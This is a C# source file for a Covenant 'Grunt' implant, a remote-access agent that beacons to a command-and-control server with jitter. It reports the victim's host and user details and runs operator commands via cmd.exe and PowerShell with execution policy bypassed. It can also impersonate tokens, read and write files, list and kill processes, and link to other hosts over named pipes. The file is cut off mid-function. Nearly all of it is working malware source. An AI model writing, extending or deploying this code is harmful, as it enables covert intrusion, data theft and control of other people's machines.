using System;
using System.Net;
using System.Linq;
using System.Text;
using System.IO;
using System.IO.Pipes;
using System.IO.Compression;
using System.Threading;
using System.Reflection;
using System.Collections.Generic;
using System.Security.Principal;
using System.Security.AccessControl;
using System.Security.Cryptography;
using System.Text.RegularExpressions;
using System.Runtime.InteropServices;

namespace GruntExecutor
{
    // P/Invoke Win32 API declarations
    internal static class Native
    {
        // Constants
        public const uint TH32CS_SNAPPROCESS = 0x00000002;
        public const int MAX_PATH = 260;
        public const uint GENERIC_READ = 0x80000000;
        public const uint GENERIC_WRITE = 0x40000000;
        public const uint FILE_SHARE_READ = 0x00000001;
        public const uint FILE_SHARE_WRITE = 0x00000002;
        public const uint OPEN_EXISTING = 3;
        public const uint CREATE_ALWAYS = 2;
        public const uint FILE_ATTRIBUTE_NORMAL = 0x80;
        public const uint INVALID_FILE_SIZE = 0xFFFFFFFF;
        public const int INVALID_HANDLE_VALUE = -1;
        public const uint FILE_ATTRIBUTE_DIRECTORY = 0x10;

        // Structures
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public struct PROCESSENTRY32W
        {
            public uint dwSize;
            public uint cntUsage;
            public uint th32ProcessID;
            public IntPtr th32DefaultHeapID;
            public uint th32ModuleID;
            public uint cntThreads;
            public uint th32ParentProcessID;
            public int pcPriClassBase;
            public uint dwFlags;
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = MAX_PATH)]
            public string szExeFile;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public struct WIN32_FIND_DATAW
        {
            public uint dwFileAttributes;
            public System.Runtime.InteropServices.ComTypes.FILETIME ftCreationTime;
            public System.Runtime.InteropServices.ComTypes.FILETIME ftLastAccessTime;
            public System.Runtime.InteropServices.ComTypes.FILETIME ftLastWriteTime;
            public uint nFileSizeHigh;
            public uint nFileSizeLow;
            public uint dwReserved0;
            public uint dwReserved1;
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = MAX_PATH)]
            public string cFileName;
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 14)]
            public string cAlternateFileName;
        }

        // Kernel32 functions
        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern uint GetCurrentDirectoryW(uint nBufferLength, StringBuilder lpBuffer);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern bool SetCurrentDirectoryW(string lpPathName);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern uint GetComputerNameW(StringBuilder lpBuffer, ref uint nSize);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr CreateToolhelp32Snapshot(uint dwFlags, uint th32ProcessID);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern bool Process32FirstW(IntPtr hSnapshot, ref PROCESSENTRY32W lppe);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern bool Process32NextW(IntPtr hSnapshot, ref PROCESSENTRY32W lppe);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool CloseHandle(IntPtr hObject);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern IntPtr CreateFileW(
            string lpFileName,
            uint dwDesiredAccess,
            uint dwShareMode,
            IntPtr lpSecurityAttributes,
            uint dwCreationDisposition,
            uint dwFlagsAndAttributes,
            IntPtr hTemplateFile);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool ReadFile(
            IntPtr hFile,
            byte[] lpBuffer,
            uint nNumberOfBytesToRead,
            out uint lpNumberOfBytesRead,
            IntPtr lpOverlapped);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool WriteFile(
            IntPtr hFile,
            byte[] lpBuffer,
            uint nNumberOfBytesToWrite,
            out uint lpNumberOfBytesWritten,
            IntPtr lpOverlapped);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern uint GetFileSize(IntPtr hFile, IntPtr lpFileSizeHigh);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern IntPtr FindFirstFileW(string lpFileName, out WIN32_FIND_DATAW lpFindFileData);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern bool FindNextFileW(IntPtr hFindFile, out WIN32_FIND_DATAW lpFindFileData);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool FindClose(IntPtr hFindFile);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool TerminateProcess(IntPtr hProcess, uint uExitCode);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);

        public const uint PROCESS_TERMINATE = 0x0001;

        // Additional file operation functions
        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern bool CreateDirectoryW(string lpPathName, IntPtr lpSecurityAttributes);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern bool DeleteFileW(string lpFileName);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern bool RemoveDirectoryW(string lpPathName);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern bool CopyFileW(string lpExistingFileName, string lpNewFileName, bool bFailIfExists);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern uint GetFileAttributesW(string lpFileName);

        public const uint INVALID_FILE_ATTRIBUTES = 0xFFFFFFFF;

        // GDI32 functions for screenshot
        [DllImport("user32.dll")]
        public static extern IntPtr GetDesktopWindow();

        [DllImport("user32.dll")]
        public static extern IntPtr GetDC(IntPtr hWnd);

        [DllImport("user32.dll")]
        public static extern int ReleaseDC(IntPtr hWnd, IntPtr hDC);

        [DllImport("user32.dll")]
        public static extern bool GetWindowRect(IntPtr hWnd, out RECT lpRect);

        [DllImport("gdi32.dll")]
        public static extern IntPtr CreateCompatibleDC(IntPtr hdc);

        [DllImport("gdi32.dll")]
        public static extern IntPtr CreateCompatibleBitmap(IntPtr hdc, int nWidth, int nHeight);

        [DllImport("gdi32.dll")]
        public static extern IntPtr SelectObject(IntPtr hdc, IntPtr hgdiobj);

        [DllImport("gdi32.dll")]
        public static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, uint dwRop);

        [DllImport("gdi32.dll")]
        public static extern bool DeleteObject(IntPtr hObject);

        [DllImport("gdi32.dll")]
        public static extern bool DeleteDC(IntPtr hdc);

        [DllImport("gdi32.dll")]
        public static extern int GetDIBits(IntPtr hdc, IntPtr hbmp, uint uStartScan, uint cScanLines, byte[] lpvBits, ref BITMAPINFO lpbi, uint uUsage);

        public const uint SRCCOPY = 0x00CC0020;
        public const uint DIB_RGB_COLORS = 0;
        public const uint BI_RGB = 0;

        [StructLayout(LayoutKind.Sequential)]
        public struct RECT
        {
            public int Left;
            public int Top;
            public int Right;
            public int Bottom;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct BITMAPINFOHEADER
        {
            public uint biSize;
            public int biWidth;
            public int biHeight;
            public ushort biPlanes;
            public ushort biBitCount;
            public uint biCompression;
            public uint biSizeImage;
            public int biXPelsPerMeter;
            public int biYPelsPerMeter;
            public uint biClrUsed;
            public uint biClrImportant;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct BITMAPINFO
        {
            public BITMAPINFOHEADER bmiHeader;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 256)]
            public uint[] bmiColors;
        }

        // Advapi32 functions
        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern bool GetUserNameW(StringBuilder lpBuffer, ref uint nSize);

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool GetTokenInformation(
            IntPtr TokenHandle,
            uint TokenInformationClass,
            IntPtr TokenInformation,
            uint TokenInformationLength,
            out uint ReturnLength);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern bool LookupAccountSidW(
            string lpSystemName,
            IntPtr Sid,
            StringBuilder lpName,
            ref uint cchName,
            StringBuilder lpReferencedDomainName,
            ref uint cchReferencedDomainName,
            out uint peUse);

        public const uint TOKEN_QUERY = 0x0008;
        public const uint TokenUser = 1;

        // Helper to get current process handle
        [DllImport("kernel32.dll")]
        public static extern IntPtr GetCurrentProcess();

        // Helper to convert FILETIME to DateTime
        public static DateTime FileTimeToDateTime(System.Runtime.InteropServices.ComTypes.FILETIME ft)
        {
            long hFT = (((long)ft.dwHighDateTime) << 32) + ft.dwLowDateTime;
            return DateTime.FromFileTime(hFT);
        }
    }
    class Grunt
    {
        public static void Execute(string CovenantURI, string CovenantCertHash, string GUID, Aes SessionKey)
        {
            try
            {
                int Delay = Convert.ToInt32(@"{{REPLACE_DELAY}}");
                int Jitter = Convert.ToInt32(@"{{REPLACE_JITTER_PERCENT}}");
                int ConnectAttempts = Convert.ToInt32(@"{{REPLACE_CONNECT_ATTEMPTS}}");
                DateTime KillDate = DateTime.FromBinary(long.Parse(@"{{REPLACE_KILL_DATE}}"));
				List<string> ProfileHttpHeaderNames = @"{{REPLACE_PROFILE_HTTP_HEADER_NAMES}}".Split(',').ToList().Select(H => System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(H))).ToList();
                List<string> ProfileHttpHeaderValues = @"{{REPLACE_PROFILE_HTTP_HEADER_VALUES}}".Split(',').ToList().Select(H => System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(H))).ToList();
				List<string> ProfileHttpUrls = @"{{REPLACE_PROFILE_HTTP_URLS}}".Split(',').ToList().Select(U => System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(U))).ToList();
				string ProfileHttpGetResponse = @"{{REPLACE_PROFILE_HTTP_GET_RESPONSE}}".Replace(Environment.NewLine, "\n");
				string ProfileHttpPostRequest = @"{{REPLACE_PROFILE_HTTP_POST_REQUEST}}".Replace(Environment.NewLine, "\n");
				string ProfileHttpPostResponse = @"{{REPLACE_PROFILE_HTTP_POST_RESPONSE}}".Replace(Environment.NewLine, "\n");
                bool ValidateCert = bool.Parse(@"{{REPLACE_VALIDATE_CERT}}");
                bool UseCertPinning = bool.Parse(@"{{REPLACE_USE_CERT_PINNING}}");

                string Hostname = Dns.GetHostName();
                string IPAddress = Dns.GetHostAddresses(Hostname)[0].ToString();
                foreach (IPAddress a in Dns.GetHostAddresses(Dns.GetHostName()))
                {
                    if (a.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
                    {
                        IPAddress = a.ToString();
                        break;
                    }
                }
                string OperatingSystem = Environment.OSVersion.ToString();
                string Process = System.Diagnostics.Process.GetCurrentProcess().ProcessName;
                int Integrity = 2;
                if (Environment.UserName.ToLower() == "system")
                {
                    Integrity = 4;
                }
                else
                {
                    var identity = WindowsIdentity.GetCurrent();
                    if (identity.Owner != identity.User)
                    {
                        Integrity = 3;
                    }
                }
                string UserDomainName = Environment.UserDomainName;
                string UserName = Environment.UserName;

                string RegisterBody = @"{ ""integrity"": " + Integrity + @", ""process"": """ + Process + @""", ""userDomainName"": """ + UserDomainName + @""", ""userName"": """ + UserName + @""", ""delay"": " + Convert.ToString(Delay) + @", ""jitter"": " + Convert.ToString(Jitter) + @", ""connectAttempts"": " + Convert.ToString(ConnectAttempts) + @", ""status"": 0, ""ipAddress"": """ + IPAddress + @""", ""hostname"": """ + Hostname + @""", ""operatingSystem"": """ + OperatingSystem + @""" }";
                IMessenger baseMessenger = null;
                baseMessenger = new HttpMessenger(CovenantURI, CovenantCertHash, UseCertPinning, ValidateCert, ProfileHttpHeaderNames, ProfileHttpHeaderValues, ProfileHttpUrls);
                baseMessenger.Read();
                baseMessenger.Identifier = GUID;
                TaskingMessenger messenger = new TaskingMessenger
                (
                    new MessageCrafter(GUID, SessionKey),
                    baseMessenger,
                    new Profile(ProfileHttpGetResponse, ProfileHttpPostRequest, ProfileHttpPostResponse)
                );
                messenger.QueueTaskingMessage(RegisterBody);
                messenger.WriteTaskingMessage();
                messenger.SetAuthenticator(messenger.ReadTaskingMessage().Message);
                try
                {
                    // A blank upward write, this helps in some cases with an HTTP Proxy
                    messenger.QueueTaskingMessage("");
                    messenger.WriteTaskingMessage();
                }
                catch (Exception) { }
                
                List<KeyValuePair<string, Thread>> Tasks = new List<KeyValuePair<string, Thread>>();
                WindowsImpersonationContext impersonationContext = null;
                Random rnd = new Random();
                int ConnectAttemptCount = 0;
                bool alive = true;
                while (alive)
                {
                    int change = rnd.Next((int)Math.Round(Delay * (Jitter / 100.00)));
                    if (rnd.Next(2) == 0) { change = -change; }
                    Thread.Sleep((Delay + change) * 1000);
                    try
                    {
                        GruntTaskingMessage message = messenger.ReadTaskingMessage();
                        if (message != null)
                        {
                            ConnectAttemptCount = 0;
                            string output = "";
                            if (message.Type == GruntTaskingType.SetDelay || message.Type == GruntTaskingType.SetJitter || message.Type == GruntTaskingType.SetConnectAttempts)
                            {
                                if (int.TryParse(message.Message, out int val))
                                {
                                    if (message.Type == GruntTaskingType.SetDelay)
                                    {
                                        Delay = val;
                                        output += "Set Delay: " + Delay;
                                    }
                                    else if (message.Type == GruntTaskingType.SetJitter)
                                    {
                                        Jitter = val;
                                        output += "Set Jitter: " + Jitter;
                                    }
                                    else if (message.Type == GruntTaskingType.SetConnectAttempts)
                                    {
                                        ConnectAttempts = val;
                                        output += "Set ConnectAttempts: " + ConnectAttempts;
                                    }
                                }
                                else
                                {
                                    output += "Error parsing: " + message.Message;
                                }
                                messenger.QueueTaskingMessage(new GruntTaskingMessageResponse(GruntTaskingStatus.Completed, output).ToJson(), message.Name);
                            }
                            else if (message.Type == GruntTaskingType.SetKillDate)
                            {
                                if (DateTime.TryParse(message.Message, out DateTime date))
                                {
                                    KillDate = date;
                                    output += "Set KillDate: " + KillDate.ToString();
                                }
                                else
                                {
                                    output += "Error parsing: " + message.Message;
                                }
                                messenger.QueueTaskingMessage(new GruntTaskingMessageResponse(GruntTaskingStatus.Completed, output).ToJson(), message.Name);
                            }
                            else if (message.Type == GruntTaskingType.Exit)
                            {
                                output += "Exited";
                                messenger.QueueTaskingMessage(new GruntTaskingMessageResponse(GruntTaskingStatus.Completed, output).ToJson(), message.Name);
                                messenger.WriteTaskingMessage();
                                return;
                            }
                            else if(message.Type == GruntTaskingType.Tasks)
                            {
                                if (!Tasks.Where(T => T.Value.IsAlive).Any()) { output += "No active tasks!"; }
                                else
                                {
                                    output += "Task       Status" + Environment.NewLine;
                                    output += "----       ------" + Environment.NewLine;
                                    output += String.Join(Environment.NewLine, Tasks.Where(T => T.Value.IsAlive).Select(T => T.Key + " Active").ToArray());
                                }
                                messenger.QueueTaskingMessage(new GruntTaskingMessageResponse(GruntTaskingStatus.Completed, output).ToJson(), message.Name);
                            }
                            else if(message.Type == GruntTaskingType.TaskKill)
                            {
                                var matched = Tasks.Where(T => T.Value.IsAlive && T.Key.ToLower() == message.Message.ToLower());
                                if (!matched.Any())
                                {
                                    output += "No active task with name: " + message.Message;
                                }
                                else
                                {
                                    KeyValuePair<string, Thread> t = matched.First();
                                    t.Value.Abort();
                                    Thread.Sleep(3000);
                                    if (t.Value.IsAlive)
                                    {
                                        t.Value.Suspend();
                                    }
                                    output += "Task: " + t.Key + " killed!";
                                }
                                messenger.QueueTaskingMessage(new GruntTaskingMessageResponse(GruntTaskingStatus.Completed, output).ToJson(), message.Name);
                            }
                            else if (message.Token)
                            {
                                if (impersonationContext != null)
                                {
                                    impersonationContext.Undo();
                                }
                                IntPtr impersonatedToken = IntPtr.Zero;
                                Thread t = new Thread(() => impersonatedToken = TaskExecute(messenger, message, Delay));
                                t.Start();
                                Tasks.Add(new KeyValuePair<string, Thread>(message.Name, t));
                                bool completed = t.Join(5000);
                                if (completed && impersonatedToken != IntPtr.Zero)
                                {
                                    try
                                    {
                                        WindowsIdentity identity = new WindowsIdentity(impersonatedToken);
                                        impersonationContext = identity.Impersonate();
                                    }
                                    catch (ArgumentException) { }
                                }
                                else
                                {
                                    impersonationContext = null;
                                }
                            }
                            else
                            {
                                Thread t = new Thread(() => TaskExecute(messenger, message, Delay));
                                t.Start();
                                Tasks.Add(new KeyValuePair<string, Thread>(message.Name, t));
                            }
                            // Clean up completed tasks to prevent memory leak
                            Tasks.RemoveAll(kvp => !kvp.Value.IsAlive);
                        }
                        messenger.WriteTaskingMessage();
                    }
                    catch (ObjectDisposedException e)
                    {
                        ConnectAttemptCount++;
                        messenger.QueueTaskingMessage(new GruntTaskingMessageResponse(GruntTaskingStatus.Completed, "").ToJson());
                        messenger.WriteTaskingMessage();
                    }
                    catch (Exception e)
                    {
                        ConnectAttemptCount++;
                        Console.Error.WriteLine("Loop Exception: " + e.GetType().ToString() + " " + e.Message + Environment.NewLine + e.StackTrace);
                    }
                    if (ConnectAttemptCount >= ConnectAttempts) { return; }
                    if (KillDate.CompareTo(DateTime.Now) < 0) { return; }
                }
            }
            catch (Exception e)
            {
                Console.Error.WriteLine("Outer Exception: " + e.Message + Environment.NewLine + e.StackTrace);
            }
        }

        private static IntPtr TaskExecute(TaskingMessenger messenger, GruntTaskingMessage message, int Delay)
        {
            const int MAX_MESSAGE_SIZE = 1048576;
            string output = "";
            try
            {
                if (message.Type == GruntTaskingType.Connect)
                {
                    string[] split = message.Message.Split(',');
                    if (split.Length >= 2 && !string.IsNullOrEmpty(split[0]) && !string.IsNullOrEmpty(split[1]))
                    {
                        bool connected = messenger.Connect(split[0], split[1]);
                        output += connected ? "Connection to " + split[0] + ":" + split[1] + " succeeded!" :
                                              "Connection to " + split[0] + ":" + split[1] + " failed.";
                    }
                    else
                    {
                        output += "Error: Invalid connect parameters. Expected format: hostname,pipename";
                    }
                }
                else if (message.Type == GruntTaskingType.Disconnect)
                {
                    bool disconnected = messenger.Disconnect(message.Message);
                    output += disconnected ? "Disconnect succeeded!" : "Disconnect failed.";
                }
                else if (message.Type == GruntTaskingType.Shell)
                {
                    // Execute command directly via Process
                    System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
                    startInfo.FileName = message.Message.Split(' ')[0];
                    startInfo.Arguments = message.Message.Contains(" ") ? message.Message.Substring(message.Message.IndexOf(' ') + 1) : "";
                    startInfo.UseShellExecute = false;
                    startInfo.RedirectStandardOutput = true;
                    startInfo.RedirectStandardError = true;
                    startInfo.CreateNoWindow = true;
                    using (System.Diagnostics.Process process = System.Diagnostics.Process.Start(startInfo))
                    {
                        output += process.StandardOutput.ReadToEnd();
                        output += process.StandardError.ReadToEnd();
                        process.WaitForExit();
                    }
                }
                else if (message.Type == GruntTaskingType.ShellCmd)
                {
                    // Execute via cmd.exe /c
                    System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
                    startInfo.FileName = "cmd.exe";
                    startInfo.Arguments = "/c " + message.Message;
                    startInfo.UseShellExecute = false;
                    startInfo.RedirectStandardOutput = true;
                    startInfo.RedirectStandardError = true;
                    startInfo.CreateNoWindow = true;
                    using (System.Diagnostics.Process process = System.Diagnostics.Process.Start(startInfo))
                    {
                        output += process.StandardOutput.ReadToEnd();
                        output += process.StandardError.ReadToEnd();
                        process.WaitForExit();
                    }
                }
                else if (message.Type == GruntTaskingType.PowerShell)
                {
                    // Execute via powershell.exe
                    System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
                    startInfo.FileName = "powershell.exe";
                    startInfo.Arguments = "-NoProfile -NonInteractive -ExecutionPolicy Bypass -Command \"" + message.Message.Replace("\"", "`\"") + "\"";
                    startInfo.UseShellExecute = false;
                    startInfo.RedirectStandardOutput = true;
                    startInfo.RedirectStandardError = true;
                    startInfo.CreateNoWindow = true;
                    using (System.Diagnostics.Process process = System.Diagnostics.Process.Start(startInfo))
                    {
                        output += process.StandardOutput.ReadToEnd();
                        output += process.StandardError.ReadToEnd();
                        process.WaitForExit();
                    }
                }
                else if (message.Type == GruntTaskingType.WhoAmI)
                {
                    // P/Invoke: GetUserNameW + token lookup for domain\user
                    try
                    {
                        IntPtr tokenHandle;
                        if (Native.OpenProcessToken(Native.GetCurrentProcess(), Native.TOKEN_QUERY, out tokenHandle))
                        {
                            uint tokenInfoLength = 0;
                            Native.GetTokenInformation(tokenHandle, Native.TokenUser, IntPtr.Zero, 0, out tokenInfoLength);
                            IntPtr tokenInfo = Marshal.AllocHGlobal((int)tokenInfoLength);
                            try
                            {
                                if (Native.GetTokenInformation(tokenHandle, Native.TokenUser, tokenInfo, tokenInfoLength, out tokenInfoLength))
                                {
                                    IntPtr sid = Marshal.ReadIntPtr(tokenInfo);
                                    StringBuilder name = new StringBuilder(256);
                                    StringBuilder domain = new StringBuilder(256);
                                    uint nameSize = 256;
                                    uint domainSize = 256;
                                    uint sidType;
                                    if (Native.LookupAccountSidW(null, sid, name, ref nameSize, domain, ref domainSize, out sidType))
                                    {
                                        output += domain.ToString() + "\\" + name.ToString();
                                    }
                                    else
                                    {
                                        // Fallback to GetUserNameW
                                        StringBuilder userName = new StringBuilder(256);
                                        uint userNameSize = 256;
                                        if (Native.GetUserNameW(userName, ref userNameSize))
                                        {
                                            output += userName.ToString();
                                        }
                                    }
                                }
                            }
                            finally
                            {
                                Marshal.FreeHGlobal(tokenInfo);
                                Native.CloseHandle(tokenHandle);
                            }
                        }
                    }
                    catch (Exception ex)
                    {
                        output += "Error: " + ex.Message;
                    }
                }
                else if (message.Type == GruntTaskingType.Pwd)
                {
                    // P/Invoke: GetCurrentDirectoryW
                    StringBuilder buffer = new StringBuilder(Native.MAX_PATH);
                    uint result = Native.GetCurrentDirectoryW((uint)Native.MAX_PATH, buffer);
                    if (result > 0)
                    {
                        output += buffer.ToString();
                    }
                    else
                    {
                        output += "Error: Failed to get current directory";
                    }
                }
                else if (message.Type == GruntTaskingType.Cd)
                {
                    // P/Invoke: SetCurrentDirectoryW
                    if (Native.SetCurrentDirectoryW(message.Message))
                    {
                        StringBuilder buffer = new StringBuilder(Native.MAX_PATH);
                        Native.GetCurrentDirectoryW((uint)Native.MAX_PATH, buffer);
                        output += "Changed directory to: " + buffer.ToString();
                    }
                    else
                    {
                        output += "Error: Failed to change directory (code: " + Marshal.GetLastWin32Error() + ")";
                    }
                }
                else if (message.Type == GruntTaskingType.ListDirectory)
                {
                    // P/Invoke: FindFirstFileW / FindNextFileW
                    StringBuilder pwdBuffer = new StringBuilder(Native.MAX_PATH);
                    Native.GetCurrentDirectoryW((uint)Native.MAX_PATH, pwdBuffer);
                    string path = string.IsNullOrEmpty(message.Message) ? pwdBuffer.ToString() : message.Message;
                    string searchPath = path.EndsWith("\\") ? path + "*" : path + "\\*";

                    output += "Directory: " + path + Environment.NewLine + Environment.NewLine;

                    Native.WIN32_FIND_DATAW findData;
                    IntPtr hFind = Native.FindFirstFileW(searchPath, out findData);

                    if (hFind.ToInt64() != Native.INVALID_HANDLE_VALUE)
                    {
                        try
                        {
                            do
                            {
                                if (findData.cFileName == "." || findData.cFileName == "..")
                                    continue;

                                DateTime lastWrite = Native.FileTimeToDateTime(findData.ftLastWriteTime);
                                bool isDir = (findData.dwFileAttributes & Native.FILE_ATTRIBUTE_DIRECTORY) != 0;
                                long fileSize = ((long)findData.nFileSizeHigh << 32) + findData.nFileSizeLow;

                                if (isDir)
                                {
                                    output += string.Format("{0,-20} {1,-10} {2}", lastWrite.ToString("yyyy-MM-dd HH:mm"), "<DIR>", findData.cFileName) + Environment.NewLine;
                                }
                                else
                                {
                                    output += string.Format("{0,-20} {1,-10} {2}", lastWrite.ToString("yyyy-MM-dd HH:mm"), fileSize, findData.cFileName) + Environment.NewLine;
                                }
                            } while (Native.FindNextFileW(hFind, out findData));
                        }
                        finally
                        {
                            Native.FindClose(hFind);
                        }
                    }
                    else
                    {
                        output += "Error: Failed to list directory (code: " + Marshal.GetLastWin32Error() + ")";
                    }
                }
                else if (message.Type == GruntTaskingType.ReadFile)
                {
                    // P/Invoke: CreateFileW / ReadFile
                    IntPtr hFile = Native.CreateFileW(
                        message.Message,
                        Native.GENERIC_READ,
                        Native.FILE_SHARE_READ,
                        IntPtr.Zero,
                        Native.OPEN_EXISTING,
                        Native.FILE_ATTRIBUTE_NORMAL,
                        IntPtr.Zero);

                    if (hFile.ToInt64() != Native.INVALID_HANDLE_VALUE)
                    {
                        try
                        {
                            uint fileSize = Native.GetFileSize(hFile, IntPtr.Zero);
                            if (fileSize != Native.INVALID_FILE_SIZE && fileSize > 0)
                            {
                                byte[] buffer = new byte[fileSize];
                                uint bytesRead;
                                if (Native.ReadFile(hFile, buffer, fileSize, out bytesRead, IntPtr.Zero))
                                {
                                    output += Encoding.UTF8.GetString(buffer, 0, (int)bytesRead);
                                }
                                else
                                {
                                    output += "Error: Failed to read file (code: " + Marshal.GetLastWin32Error() + ")";
                                }
                            }
                            else if (fileSize == 0)
                            {
                                output += "(empty file)";
                            }
                            else
                            {
                                output += "Error: Failed to get file size (code: " + Marshal.GetLastWin32Error() + ")";
                            }
                        }
                        finally
                        {
                            Native.CloseHandle(hFile);
                        }
                    }
                    else
                    {
                        output += "Error: Failed to open file (code: " + Marshal.GetLastWin32Error() + ")";
                    }
                }
                else if (message.Type == GruntTaskingType.WriteFile)
                {
                    // P/Invoke: CreateFileW / WriteFile
                    try
                    {
                        string[] parts = message.Message.Split(new char[] { '|' }, 2);
                        if (parts.Length == 2)
                        {
                            byte[] content = Convert.FromBase64String(parts[1]);

                            IntPtr hFile = Native.CreateFileW(
                                parts[0],
                                Native.GENERIC_WRITE,
                                0,
                                IntPtr.Zero,
                                Native.CREATE_ALWAYS,
                                Native.FILE_ATTRIBUTE_NORMAL,
                                IntPtr.Zero);

                            if (hFile.ToInt64() != Native.INVALID_HANDLE_VALUE)
                            {
                                try
                                {
                                    uint bytesWritten;
                                    if (Native.WriteFile(hFile, content, (uint)content.Length, out bytesWritten, IntPtr.Zero))
                                    {
                                        output += "File written: " + parts[0] + " (" + bytesWritten + " bytes)";
                                    }
                                    else
                                    {
                                        output += "Error: Failed to write file (code: " + Marshal.GetLastWin32Error() + ")";
                                    }
                                }
                                finally
                                {
                                    Native.CloseHandle(hFile);
                                }
                            }
                            else
                            {
                                output += "Error: Failed to create file (code: " + Marshal.GetLastWin32Error() + ")";
                            }
                        }
                        else
                        {
                            output += "Error: Invalid format. Use: path|base64content";
                        }
                    }
                    catch (Exception ex)
                    {
                        output += "Error: " + ex.Message;
                    }
                }
                else if (message.Type == GruntTaskingType.GetHostname)
                {
                    // P/Invoke: GetComputerNameW
                    StringBuilder buffer = new StringBuilder(256);
                    uint size = 256;
                    if (Native.GetComputerNameW(buffer, ref size) != 0)
                    {
                        output += buffer.ToString();
                    }
                    else
                    {
                        output += "Error: Failed to get hostname (code: " + Marshal.GetLastWin32Error() + ")";
                    }
                }
                else if (message.Type == GruntTaskingType.ProcessList)
                {
                    // P/Invoke: CreateToolhelp32Snapshot / Process32FirstW / Process32NextW
                    output += string.Format("{0,-8} {1,-40} {2,-8}", "PID", "Name", "PPID") + Environment.NewLine;
                    output += new string('-', 60) + Environment.NewLine;

                    IntPtr hSnapshot = Native.CreateToolhelp32Snapshot(Native.TH32CS_SNAPPROCESS, 0);
                    if (hSnapshot.ToInt64() != Native.INVALID_HANDLE_VALUE)
                    {
                        try
                        {
                            Native.PROCESSENTRY32W pe32 = new Native.PROCESSENTRY32W();
                            pe32.dwSize = (uint)Marshal.SizeOf(typeof(Native.PROCESSENTRY32W));

                            if (Native.Process32FirstW(hSnapshot, ref pe32))
                            {
                                do
                                {
                                    output += string.Format("{0,-8} {1,-40} {2,-8}", pe32.th32ProcessID, pe32.szExeFile, pe32.th32ParentProcessID) + Environment.NewLine;
                                } while (Native.Process32NextW(hSnapshot, ref pe32));
                            }
                        }
                        finally
                        {
                            Native.CloseHandle(hSnapshot);
                        }
                    }
                    else
                    {
                        output += "Error: Failed to create snapshot (code: " + Marshal.GetLastWin32Error() + ")";
                    }
                }
                else if (message.Type == GruntTaskingType.Kill)
                {
                    // P/Invoke: OpenProcess / TerminateProcess
                    try
                    {
                        uint pid = uint.Parse(message.Message);
                        IntPtr hProcess = Native.OpenProcess(Native.PROCESS_TERMINATE, false, pid);
                        if (hProcess != IntPtr.Zero)
                        {
                            try
                            {
                                if (Native.TerminateProcess(hProcess, 0))
                                {
                                    output += "Killed process: " + pid;
                                }
                                else
                                {
                                    output += "Error: Failed to terminate process (code: " + Marshal.GetLastWin32Error() + ")";
                                }
                            }
                            finally
                            {
                                Native.CloseHandle(hProcess);
                            }
                        }
                        else
                        {
                            output += "Error: Failed to open process (code: " + Marshal.GetLastWin32Error() + ")";
                        }
                    }
                    catch (Exception ex)
                    {
                        output += "Error: " + ex.Message;
                    }
                }
                else if (message.Type == GruntTaskingType.CreateDirectory)
                {
                    // P/Invoke: CreateDirectoryW
                    try
                    {
                        if (Native.CreateDirectoryW(message.Message, IntPtr.Zero))
                        {
                            output += "Directory created: " + message.Message;
                        }
                        else
                        {
                            int error = Marshal.GetLastWin32Error();
                            if (error == 183) // ERROR_ALREADY_EXISTS
                            {
                                output += "Directory already exists: " + message.Message;
                            }
                            else
                            {
                                output += "Error: Failed to create directory (code: " + error + ")";
                            }
                        }
                    }
                    catch (Exception ex)
                    {
                        output += "Error: " + ex.Message;
                    }
                }
                else if (message.Type == GruntTaskingType.Delete)
                {
                    // P/Invoke: DeleteFileW or RemoveDirectoryW
                    try
                    {
